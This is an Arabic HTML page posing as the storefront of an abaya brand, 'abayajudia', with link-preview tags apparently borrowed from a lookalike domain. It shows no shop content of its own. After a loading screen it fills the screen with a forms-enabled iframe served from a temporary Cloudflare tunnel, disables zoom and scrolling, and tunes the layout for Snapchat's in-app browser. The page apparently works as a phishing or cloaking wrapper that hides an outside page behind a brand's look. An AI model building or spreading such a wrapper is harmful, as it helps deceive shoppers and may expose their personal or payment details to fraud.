<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <!-- إجبار الموبايل على تثبيت مقاسات العرض ومنع أي تكبير عشوائي يفسد الـ DOM -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>abayajudia</title>
    <meta property="og:title" content="abayajudia">
    <meta property="og:description" content="باعتبارنا علامة تجارية متخصصة في العبايات فإننا نقدم مجموعة متنوعة من المنتجات بما في ذلك العبايات والتنانير والبلوزات والسترات وكل ما تحتاجه.">
    <meta property="og:image" content="https://abayajudi.com/wp-content/uploads/2024/09/SAVE_20260513_190924.jpg">
    <meta property="og:url" content="https://abayajudia.new-collection/">
    <meta property="og:type" content="website">
    
    <style>
        /* إغلاق كامل ومطلق للـ Body والـ HTML لمنع أي Scroll خارجي */
        * {
            box-sizing: border-box;
        }
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden !important;
            background-color: #ffffff;
            font-family: Tahoma, sans-serif;
            position: fixed;
            top: 0;
            left: 0;
        }
        
        /* شاشة التحميل الاحترافية */
        #loader {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.3s ease;
        }

        .spinner {
            width: 45px;
            height: 45px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #111;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .brand-loading {
            font-size: 18px;
            font-weight: bold;
            color: #222;
            letter-spacing: 1px;
        }

        /* حاوية عزل هندسية (GPU Layer Isolation) لمنع تداخل عناصر الـ WebView */
        .viewport-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #ffffff;
            -webkit-overflow-scrolling: touch;
            transform: translateZ(0); /* تفعيل التسريع العتادي لمنع تشوه العناصر */
        }

        /* الـ iframe بمعاملات تحجيم صارمة تمنع ازدواجية الرسوميات في سناب شات */
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            display: block;
            background: #ffffff;
            position: absolute;
            top: 0;
            left: 0;
        }
    </style>
</head>
<body>

    <!-- شاشة التحميل -->
    <div id="loader">
        <div class="spinner"></div>
        <div class="brand-loading">abayajudia</div>
    </div>

    <!-- الحاوية الهندسية المعزولة -->
    <div class="viewport-container" id="viewportContainer">
        <iframe 
            id="contentFrame"
            src="https://norm-submitting-discuss-gis.trycloudflare.com" 
            sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-presentation"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
            onload="hideLoader()">
        </iframe>
    </div>

    <script>
        function hideLoader() {
            const loader = document.getElementById('loader');
            if (loader) {
                loader.style.opacity = '0';
                setTimeout(() => {
                    loader.style.display = 'none';
                }, 300);
            }
        }

        // إخفاء التحميل تلقائياً بعد 5 ثوانٍ لضمان عدم تعليق الواجهة
        setTimeout(function() {
            hideLoader();
        }, 5000);

        // حل تقني ذكي: تصحيح الارتفاع فوريًا عند تغير حجم الـ WebView في سناب شات
        function adjustViewport() {
            var container = document.getElementById('viewportContainer');
            if (container) {
                container.style.height = window.innerHeight + 'px';
                container.style.width = window.innerWidth + 'px';
            }
        }

        window.addEventListener('resize', adjustViewport);
        window.addEventListener('orientationchange', function() {
            setTimeout(adjustViewport, 200);
        });
        
        adjustViewport();
    </script>

</body>
</html>
